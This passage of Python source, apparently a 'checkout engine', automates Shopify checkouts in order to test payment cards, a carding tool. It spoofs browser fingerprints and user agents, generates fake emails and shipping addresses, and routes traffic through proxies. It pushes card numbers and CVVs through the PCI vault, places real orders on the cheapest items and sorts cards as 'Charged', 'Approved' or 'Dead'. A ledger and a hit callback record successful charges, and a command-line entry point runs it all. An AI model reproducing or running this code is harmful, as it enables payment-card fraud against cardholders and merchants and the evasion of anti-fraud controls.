        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }

def _post_proposal(client: TLSClient, shop_url, checkout_url, checkout_token,
                   session_token, build_id, source_token, proposal_id, variables) -> Tuple[int, str]:
    body = json.dumps({"variables": variables, "operationName": "Proposal", "id": proposal_id})
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=body,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
    )
    return resp.status_code, resp.text

# ──────────────────────── step 9: pci tokenisation ─────────────────────

def send_pci_session(ident_sig, card_number, card_name, card_month, card_year,
                     cvv, shop_domain, proxy_url="", vault_url="", vault_domain="",
                     impersonate="chrome124") -> Tuple[int, str]:
    endpoint = vault_url or "https://checkout.pci.shopifyinc.com/sessions"
    scope    = vault_domain or shop_domain
    origin   = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"

    payload = json.dumps({
        "credit_card": {
            "number": card_number, "month": card_month, "year": card_year,
            "verification_value": cvv,
            "start_month": None, "start_year": None,
            "issue_number": "", "name": card_name,
        },
        "payment_session_scope": scope,
    })

    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": origin,
        "referer": f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
    }
    kw = {"impersonate": impersonate, "timeout": 20}
    if proxy_url: kw["proxy"] = proxy_url
    with Session(**kw) as s:
        resp = s.post(endpoint, data=payload, headers=headers)
    return resp.status_code, resp.text

def extract_pci_session_id(body: str) -> str:
    m = re.search(r'"id"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""

# ──────────────────────── step 10/11: submit + poll ────────────────────

def send_submit_for_completion(
    client: TLSClient, shop_url, checkout_url, checkout_token, session_token,
    stable_id, variant_id, merch_id, price, submit_id, build_id, source_token,
    queue_token, email, addr: Address, delivery_handle, shipping_amount,
    total_amount, pci_session_id, attempt_token, currency, country,
    signed_handles, payment_method_id, tax_amount="0.0",
) -> Tuple[int, str]:
    submit_input = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token or "",
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [{
                "destination": _addr_street(addr),
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_handle, "customDeliveryRate": False,
                    },
                    "options": {"phone": addr.phone},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"value": {"amount": str(shipping_amount or 0), "currencyCode": currency}},
                "destinationChanged": False,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": True,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        },
        "deliveryExpectations": {
            "deliveryExpectationLines": [{"signedHandle": h} for h in (signed_handles or [])]
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id": f"gid://shopify/ProductVariantMerchandise/{merch_id}",
                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                }},
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"value": {"amount": price, "currencyCode": currency}},
                "lineComponentsSource": None,
                "lineComponents": [],
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True},
            "paymentLines": [{
                "paymentMethod": {"directPaymentMethod": {
                    "paymentMethodIdentifier": payment_method_id,
                    "sessionId": pci_session_id,
                    "billingAddress": _addr_street(addr),
                    "cardSource": None,
                }},
                "amount": {"value": {"amount": total_amount, "currencyCode": currency}},
                "dueAt": None,
            }],
            "billingAddress": _addr_street(addr),
        },
        "buyerIdentity": _buyer_identity(currency, country, email, addr),
        "tip": {"tipLines": []},
        "poNumber": None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {"value": {"amount": str(tax_amount or "0.0"), "currencyCode": currency}},
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }

    submit_vars = {
        "input": submit_input,
        "attemptToken": attempt_token,
        "metafields": [],
        "analytics": {"requestUrl": checkout_url},
    }

    body = json.dumps({"variables": submit_vars, "operationName": "SubmitForCompletion", "id": submit_id})
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=body,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
    )
    return resp.status_code, resp.text

def send_poll_for_receipt(client: TLSClient, shop_url, checkout_url, checkout_token,
                          session_token, build_id, source_token, poll_id,
                          receipt_id, receipt_session_token) -> Tuple[int, str]:
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    h = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    h["x-checkout-web-source-id"] = checkout_token
    resp = client.get(url, headers=h)
    return resp.status_code, resp.text

# ──────────────────────── retryable-submit markers ────────────────────

_RETRYABLE_SUBMIT = (
    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
    "DELIVERY_DELIVERY_STRATEGY_CHANGED",
    "SOME_DELIVERY_DETAILS_MAY_HAVE_CHANGED",
    "THE_SUM_OF_PROPOSED_PAYMENTS_CANNOT_COVER",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "ADDITIONAL_ARTIFACT",
    "THE_CURRENCY_YOU_SELECTED_IS_NO_LONGER",
)

# =============================================================================
# HIT CALLBACK (optional integration point)
# =============================================================================

_HIT_CALLBACK: Optional[Callable[[dict], None]] = None

def set_hit_callback(fn: Callable[[dict], None]):
    global _HIT_CALLBACK
    _HIT_CALLBACK = fn

def _fire_hit(result_dict: dict):
    if _HIT_CALLBACK:
        try: _HIT_CALLBACK(result_dict)
        except Exception: pass

# =============================================================================
# ORCHESTRATOR — run_checkout_for_card
# =============================================================================

def run_checkout_for_card(shop_url: str, card_entry: str,
                          proxy_url: str = "", low: bool = True) -> CheckResult:
    t_start = time.time()
    stage_timings: Dict[str, int] = {}
    def _mark(name, t0): stage_timings[name] = int((time.time() - t0) * 1000)

    site_name = urllib.parse.urlparse(shop_url).hostname or shop_url
    result = CheckResult(
        card=card_entry, shop_url=shop_url, site_name=site_name,
        status=CheckStatus.ERROR, stage_timings=stage_timings,
    )

    # ─── ledger short-circuit ───
    ledger_entry = ledger_lookup(card_entry)
    if ledger_entry:
        result.status       = CheckStatus.CHARGED
        result.status_code  = "ORDER_PLACED"
        result.amount       = ledger_entry.get("amount", "")
        result.currency     = ledger_entry.get("currency", "USD")
        result.receipt_url  = ledger_entry.get("receipt_url", "")
        result.from_ledger  = True
        result.duration_ms  = int((time.time() - t_start) * 1000)
        return result

    # ─── parse card ───
    try:
        cc, mm, yyyy, cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e; result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    if not validate_card_luhn(cc):
        result.status_code = "CARD_INVALID_LUHN"
        result.error = Exception("luhn fail")
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    # ─── normalize proxy ───
    if proxy_url:
        try:
            proxy_url = normalize_proxy(proxy_url)
        except Exception as e:
            result.error = e; result.duration_ms = int((time.time() - t_start) * 1000)
            return result

    # ─── random browser fingerprint ───
    impersonate = random.choice(BROWSER_PROFILES)
    ua          = random.choice(USER_AGENTS)
    email       = generate_random_email()

    client = TLSClient(timeout=20, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=ua)

    try:
        # ─── step 0 ───
        t0 = time.time()
        try:
            _title, _product_id, variant_id, price = find_cheapest_product(
                client, shop_url, low=low)
        except Exception as e:
            result.error = Exception(f"step0: {e}")
            result.retryable = True
            _mark("step0", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step0", t0)

        # ─── step 1 ───
        t0 = time.time()
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                add_to_cart_and_checkout(client, shop_url, variant_id)
        except Exception as e:
            result.error = Exception(f"step1: {e}")
            result.retryable = True
            _mark("step1", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        stable_id    = extract_stable_id(checkout_html)
        build_id     = extract_commit_sha(checkout_html)
        source_token = extract_source_token(checkout_html)

        if not stable_id or not build_id or not source_token:
            result.error = Exception("step1: missing stableId/buildId/sourceToken")
            result.retryable = True
            _mark("step1", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step1", t0)

        # ─── step 2 (best-effort) ───
        t0 = time.time()
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if pat_id:
                fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception:
            pass
        _mark("step2", t0)

        # ─── step 3 ───
        t0 = time.time()
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("no actions JS url")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id   = extract_submit_id(js_body)
            poll_id     = extract_poll_id(js_body) or \
                "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal / Submit ID")
        except Exception as e:
            result.error = Exception(f"step3: {e}")
            result.retryable = True
            _mark("step3", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step3", t0)

        # ─── steps 4-8: proposal negotiation ───
        t0 = time.time()
        currency = "USD"
        country  = "US"
        queue_token = ""
        addr = address_for_country(country)
        seller_js = ""

        try:
            # proposal 1 — get currency + country
            v1 = _build_proposal_vars(
                session_token, queue_token, stable_id, variant_id, variant_id,
                currency, country, price, email, addr,
            )
            _, p1_body = _post_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                build_id, source_token, proposal_id, v1,
            )
            seller = extract_seller(p1_body)
            if seller:
                cur = extract_seller_currency(p1_body)
                if cur: currency = cur
                ctr = extract_seller_country(p1_body)
                if ctr: country = ctr
                result.currency = currency
                addr = address_for_country(country)
                queue_token = extract_queue_token(p1_body) or queue_token
                rt = extract_running_total(p1_body)
                if rt: result.amount = rt
                seller_js = p1_body

            # proposal 2 — email + shipping country fallback
            fallback_list = [country] + [c for c in SHIPPING_FALLBACK_ORDER if c != country]
            chosen_body = ""
            delivery_handle = ""
            shipping_amount = "0.0"
            tax_amount      = "0.0"
            signed_handles: List[str] = []

            for try_country in fallback_list:
                addr = address_for_country(try_country)
                v2 = _build_proposal_vars(
                    session_token, queue_token, stable_id, variant_id, variant_id,
                    currency, country, price, email, addr,
                )
                _, p2_body = _post_proposal(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, proposal_id, v2,
                )
                seller2 = extract_seller(p2_body)
                if not seller2:
                    continue
                dlv = seller2.get("delivery") or {}
                if dlv.get("__typename") != "FilledDeliveryTerms":
                    continue
                delivery_handle = extract_delivery_handle(p2_body)
                shipping_amount = extract_shipping_amount(p2_body) or "0.0"
                tax_amount      = extract_tax_amount(p2_body) or "0.0"
                signed_handles  = extract_signed_handles(p2_body)
                chosen_body     = p2_body
                break

            if chosen_body:
                seller_js = chosen_body

            # proposal 3 — final, with delivery handle + signed handles
            v3 = _build_proposal_vars(
                session_token, queue_token, stable_id, variant_id, variant_id,
                currency, country, price, email, addr,
                delivery_handle=delivery_handle or None,
                shipping_amount=shipping_amount,
                tax_amount=tax_amount,
                signed_handles=signed_handles,
            )
            _, p3_body = _post_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                build_id, source_token, proposal_id, v3,
            )
            seller_js = p3_body

            # refresh delivery_handle / shipping_amount from final
            final_handle  = extract_delivery_handle(p3_body) or delivery_handle
            final_ship    = extract_shipping_amount(p3_body) or shipping_amount
            final_tax     = extract_tax_amount(p3_body) or tax_amount
            final_handles = extract_signed_handles(p3_body) or signed_handles
            total_amount  = extract_checkout_total(p3_body) or result.amount or price
            payment_method_id = extract_payment_method_id(p3_body) or \
                                extract_payment_method_id(seller_js)

            result.amount   = total_amount
            result.currency = currency

        except Exception as e:
            result.error = Exception(f"steps4-8: {e}")
            result.retryable = True
            _mark("steps4-8", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if not final_handle and not payment_method_id:
            result.error = Exception("steps4-8: no delivery handle + no payment id")
            result.retryable = True
            _mark("steps4-8", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("steps4-8", t0)

        # ─── step 9: PCI ───
        t0 = time.time()
        try:
            ident_sig    = extract_ident_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("no identification signature")

            card_name = f"{addr.first_name} {addr.last_name}"

            _, pci_body = send_pci_session(
                ident_sig, cc, card_name, mm, yyyy, cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain,
                impersonate=impersonate,
            )
            pci_session_id = extract_pci_session_id(pci_body)

            # fallback vault
            if not pci_session_id:
                fb = ("https://checkout.pci.shopifycs.com/sessions"
                      if "shopifyinc" in (vault_url or "")
                      else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, cc, card_name, mm, yyyy, cvv,
                    site_name, proxy_url, vault_url=fb,
                    impersonate=impersonate,
                )
                pci_session_id = extract_pci_session_id(pci_body)

            # no-proxy fallback for tunnel errors
            if not pci_session_id and proxy_url:
                _, pci_body = send_pci_session(
                    ident_sig, cc, card_name, mm, yyyy, cvv,
                    vault_domain, "",
                    vault_url=vault_url, vault_domain=vault_domain,
                    impersonate=impersonate,
                )
                pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id:
                raise Exception(f"no session id (body: {pci_body[:120]})")
        except Exception as e:
            result.error = Exception(f"step9: {e}")
            result.retryable = True
            _mark("step9", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step9", t0)

        # ─── step 10: submit (with tax-retry + retryable-submit retry) ───
        t0 = time.time()
        try:
            attempt_token = f"{checkout_token}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"

            current_tax   = final_tax
            current_total = total_amount
            current_ship  = final_ship

            submit_body = ""
            for attempt in range(1, 5):
                _, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, variant_id, price, submit_id,
                    build_id, source_token, queue_token, email, addr,
                    final_handle, current_ship, current_total,
                    pci_session_id, attempt_token, currency, country,
                    final_handles, payment_method_id,
                    tax_amount=current_tax,
                )

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    m = re.search(r'"amount"\s*:\s*"([\d.]+)"', submit_body)
                    if m: current_tax = m.group(1)
                    m2 = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([\d.]+)"', submit_body)
                    if m2: current_total = m2.group(1)
                    time.sleep(0.2)
                    continue

                if any(m in submit_body for m in _RETRYABLE_SUBMIT):
                    # refresh proposal, get new queue token + shipping, retry
                    v4 = _build_proposal_vars(
                        session_token, queue_token, stable_id, variant_id, variant_id,
                        currency, country, price, email, addr,
                        delivery_handle=final_handle or None,
                        shipping_amount=current_ship,
                        tax_amount=current_tax,
                        signed_handles=final_handles,
                    )
                    try:
                        _, refresh = _post_proposal(
                            client, shop_url, checkout_url, checkout_token, session_token,
                            build_id, source_token, proposal_id, v4,
                        )
                        new_queue = extract_queue_token(refresh)
                        if new_queue: queue_token = new_queue
                        new_handle = extract_delivery_handle(refresh)
                        if new_handle: final_handle = new_handle
                        new_ship = extract_shipping_amount(refresh)
                        if new_ship: current_ship = new_ship
                        new_tax = extract_tax_amount(refresh)
                        if new_tax: current_tax = new_tax
                        new_total = extract_checkout_total(refresh)
                        if new_total: current_total = new_total
                        new_handles = extract_signed_handles(refresh)
                        if new_handles: final_handles = new_handles
                    except Exception:
                        pass
                    attempt_token = f"{checkout_token}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"
                    time.sleep(0.3)
                    continue

                break

            logger.debug(f"submit body: {submit_body[:400]}")
        except Exception as e:
            result.error = Exception(f"step10: {e}")
            result.retryable = True
            _mark("step10", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        # check for captcha
        if "CAPTCHA_REQUIRED" in submit_body.upper() or "CAPTCHA" in submit_body.upper():
            result.status = CheckStatus.DECLINED
            result.status_code = "CAPTCHA_REQUIRED"
            result.retryable = False
            result.error = Exception("CAPTCHA_REQUIRED")
            _mark("step10", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        receipt_id = extract_receipt_id(submit_body)
        if not receipt_id:
            err = extract_any_error(submit_body)
            if err:
                result.status = CheckStatus.DECLINED
                result.status_code = err[:60].upper().replace(" ", "_")
                result.error = Exception(err)
                result.retryable = any(k in err.lower() for k in ("inventory", "retry", "generic"))
            else:
                result.error = Exception("step10: no receipt id or error")
                result.retryable = True
            _mark("step10", t0); result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        receipt_session = extract_receipt_session(submit_body) or session_token
        _mark("step10", t0)

        # ─── step 11: poll ───
        t0 = time.time()
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_re = re.compile(
            r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|'
            r'ProcessedReceipt|ActionRequiredReceipt|WaitingReceipt)"')

        for poll_num in range(1, 21):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_id, receipt_id, receipt_session,
                )
            except Exception as e:
                result.error = Exception(f"poll {poll_num}: {e}")
                result.retryable = True
                _mark("step11", t0); result.duration_ms = int((time.time() - t_start) * 1000)
                return result

            m = type_re.search(poll_body)
            rtype = m.group(1) if m else ""

            if rtype in ("SuccessfulReceipt", "ProcessedReceipt"):
                result.status      = CheckStatus.CHARGED
                result.status_code = "ORDER_PLACED"
                try:
                    j = json.loads(poll_body)
                    conf = _jget(j, "data","receipt","confirmationPage","url", default="")
                    result.receipt_url = conf or checkout_url
                except Exception:
                    result.receipt_url = checkout_url
                try:
                    ledger_record(card_entry, result.amount or total_amount,
                                  result.currency or currency, site_name,
                                  result.receipt_url)
                except Exception:
                    pass
                _mark("step11", t0)
                result.duration_ms = int((time.time() - t_start) * 1000)
                _fire_hit(asdict(result))
                return result

            if rtype == "ActionRequiredReceipt":
                result.status      = CheckStatus.APPROVED
                result.status_code = "3DS_AUTHENTICATION"
                _mark("step11", t0)
                result.duration_ms = int((time.time() - t_start) * 1000)
                return result

            if rtype == "FailedReceipt":
                m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                code = m.group(1) if m else "UNKNOWN"

                if code == "INSUFFICIENT_FUNDS":
                    result.status      = CheckStatus.APPROVED
                    result.status_code = "INSUFFICIENT_FUNDS"
                    _mark("step11", t0)
                    result.duration_ms = int((time.time() - t_start) * 1000)
                    return result

                if code == "CAPTCHA_REQUIRED":
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "CAPTCHA_REQUIRED"
                    result.retryable   = False
                    result.error       = Exception("CAPTCHA_REQUIRED")
                    _mark("step11", t0)
                    result.duration_ms = int((time.time() - t_start) * 1000)
                    return result

                if "InventoryReservationFailure" in poll_body:
                    result.status    = CheckStatus.ERROR
                    result.retryable = True
                    _mark("step11", t0)
                    result.duration_ms = int((time.time() - t_start) * 1000)
                    return result

                site_signals = ("fraud","not supported","brand","suspected",
                                "risk","shipping","artifact","transformer",
                                "not available","cannot be placed")
                low = (code + " " + poll_body).lower()
                if any(s in low for s in site_signals):
                    result.status    = CheckStatus.ERROR
                    result.retryable = True
                    result.error     = Exception(code)
                    _mark("step11", t0)
                    result.duration_ms = int((time.time() - t_start) * 1000)
                    return result

                result.status      = CheckStatus.DECLINED
                result.status_code = code
                result.error       = Exception(code)
                _mark("step11", t0)
                result.duration_ms = int((time.time() - t_start) * 1000)
                return result

            delay = 0.5
            m = poll_delay_re.search(poll_body)
            if m:
                try: delay = min(int(m.group(1)) / 1000.0, 3.0)
                except Exception: pass
            time.sleep(delay)

        result.status      = CheckStatus.ERROR
        result.status_code = "POLL_TIMEOUT"
        result.retryable   = True
        result.error       = Exception("poll timeout")
        _mark("step11", t0)
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    finally:
        client.close()

# ──────────────────────── public dict wrapper ──────────────────────────

def _build_dict(res: CheckResult, proxy_url: str = "") -> dict:
    name = res.status.name
    try: price_value = float(res.amount) if res.amount else 0.0
    except Exception: price_value = 0.0

    base = {
        "card": res.card, "site": res.shop_url, "gateway": "Shopify",
        "price": res.amount or "-", "price_value": price_value,
        "proxy": proxy_url, "currency": res.currency or "USD",
        "receipt_url": res.receipt_url or "",
        "duration_ms": res.duration_ms,
        "stage_timings": res.stage_timings,
        "from_ledger": res.from_ledger,
    }
    if name == "CHARGED":
        msg = "ORDER_PLACED (previously charged)" if res.from_ledger else "ORDER_PLACED"
        return {**base, "status": "Charged", "message": msg,
                "status_code": "ORDER_PLACED", "retryable": False}
    if name == "APPROVED":
        return {**base, "status": "Approved",
                "message": res.status_code or "APPROVED",
                "status_code": res.status_code or "APPROVED",
                "retryable": False}
    if name == "DECLINED":
        return {**base, "status": "Dead",
                "message": res.status_code or "CARD_DECLINED",
                "status_code": res.status_code or "CARD_DECLINED",
                "retryable": False}
    return {**base, "status": "Error",
            "message": str(res.error or "error")[:150],
            "status_code": res.status_code or "ERROR",
            "retryable": res.retryable}

def run_checkout_public(shop_url: str, card: str, proxy_url: str = "",
                        low: bool = True) -> dict:
    res = run_checkout_for_card(shop_url, card, proxy_url, low=low)
    return _build_dict(res, proxy_url)

async def run_checkout_async(shop_url: str, card: str, proxy_url: str = "",
                             low: bool = True) -> dict:
    loop = asyncio.get_running_loop()
    res = await loop.run_in_executor(
        None, run_checkout_for_card, shop_url, card, proxy_url, low
    )
    return _build_dict(res, proxy_url)

# ──────────────────────── stats ────────────────────────────────────────

def engine_stats() -> dict:
    return {
        "version": VERSION,
        "engine": "curl_cffi-inline-full",
        "bin_cache_size": len(_BIN_CACHE),
        "recent_prices_domains": len(_recent_prices),
        "ledger": ledger_stats(),
    }

# ──────────────────────── CLI ──────────────────────────────────────────

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 6:
        print("Usage: python checkout_engine.py <card> <mm> <yyyy> <cvv> <shop_url> [proxy]")
        print(f"Version: {VERSION}")
        print(f"Stats: {engine_stats()}")
        sys.exit(1)
    card = f"{sys.argv[1]}|{sys.argv[2]}|{sys.argv[3]}|{sys.argv[4]}"
    shop = sys.argv[5]
    proxy = sys.argv[6] if len(sys.argv) > 6 else ""
    print(f"\nShopify Engine v{VERSION}")
    print(f"  Card:  {card}")
    print(f"  Site:  {shop}")
    print(f"  Proxy: {proxy or '(none)'}\n")
    r = run_checkout_public(shop, card, proxy, True)
    for k, v in r.items():
        print(f"  {k}: {v}")
    sys.exit(0 if r.get("status") in ("Charged", "Approved") else 1)